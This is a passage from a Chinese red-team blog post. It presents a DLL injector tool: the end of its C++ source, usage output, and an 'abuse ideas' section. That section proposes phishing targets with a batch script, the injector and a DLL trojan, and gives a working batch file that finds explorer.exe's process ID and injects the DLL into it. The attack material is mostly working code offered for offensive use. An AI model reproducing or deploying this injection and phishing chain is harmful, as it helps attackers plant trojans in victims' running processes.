</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;WaitForSingleObject(LoadLibraryA thread) failed. Error code: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> GetLastError() <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>9</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Ok, finished dll injection.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>签名情况：</p><p><img src=https://images.payloads.online/2024-07-29-86bbb43d1859d52ea12e73cc03a6b184a25e4f0239431b109b35aa49de3c27d9.png alt=3></p><p>使用方式，只需要两个参数：</p><ul><li>pid : 目标进程的进程ID</li><li>dll name: 想要注入目标进程的DLL绝对路径</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>C:<span style=color:#960050;background-color:#1e0010>\</span>Users<span style=color:#960050;background-color:#1e0010>\</span>Administrator<span style=color:#960050;background-color:#1e0010>\</span>Downloads<span style=color:#f92672>&gt;</span>inject_dll_amd64.exe
</span></span><span style=display:flex><span>Running executable to inject dll.
</span></span><span style=display:flex><span>Expected <span style=color:#ae81ff>2</span> arguments (pid, dll name).
</span></span></code></pre></div><p>测试效果：</p><p><img src=https://images.payloads.online/2024-07-29-d239af6fc3a3e340f245ce3f15dd9d50a35f4d1b876b14760207326feea194f0.png alt=4></p><p>滥用思路：</p><ol><li>钓鱼的时候可以发送一个BAT批处理脚本、dll注入器、dll木马</li><li>BAT批处理：获取x64进程的pid</li><li>BAT批处理：获取dll木马绝对路径</li><li>BAT批处理：执行dll注入器，将dll木马注入到目标进程中</li></ol><p><img src=https://images.payloads.online/2024-07-29-6427dc8baed64cec09ed7934e49ef9188954f50c44761035110c9f7f93562fdd.png alt=5></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>@echo off
</span></span><span style=display:flex><span>set target_process_name<span style=color:#f92672>=</span>explorer.exe
</span></span><span style=display:flex><span>set dll_name<span style=color:#f92672>=</span>calc_x64.dll
</span></span><span style=display:flex><span>set injecter<span style=color:#f92672>=</span>inject_dll_amd64.exe
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> /f <span style=color:#e6db74>&#34;tokens=2&#34;</span> %%i in <span style=color:#f92672>(</span><span style=color:#e6db74>&#39;tasklist ^| findstr /i &#34;%target_process_name%&#34;&#39;</span><span style=color:#f92672>)</span> <span style=color:#66d9ef>do</span> set <span style=color:#e6db74>&#34;pid=%%i&#34;</span>
</span></span><span style=display:flex><span>set <span style=color:#e6db74>&#34;command=%CD%\%injecter% %pid% %CD%\%dll_name%&#34;</span>
</span></span><span style=display:flex><span>%command%
</span></span></code></pre></div><p><strong>注意：被注入的DLL文件路径必须是绝对路径才可以注入成功</strong></p><p>最后的最后，致谢 @Akkuman</p></section><footer class="mt-12 flex flex-wrap"><a class="mb-1.5 rounded-lg bg-black/[3%] px-5 py-1 no-underline hover:bg-black/[6%] ltr:mr-1.5 rtl:ml-1.5 dark:bg-white/[8%] dark:hover:bg-white/[12%]" href=https://payloads.online/tags/vscode>vscode</a></footer><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2023-09-18/phishing/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>邮件钓鱼与T1218.001</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2023-08-10/redteam-operation-code-of-conduct/><span>红队行动守则</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>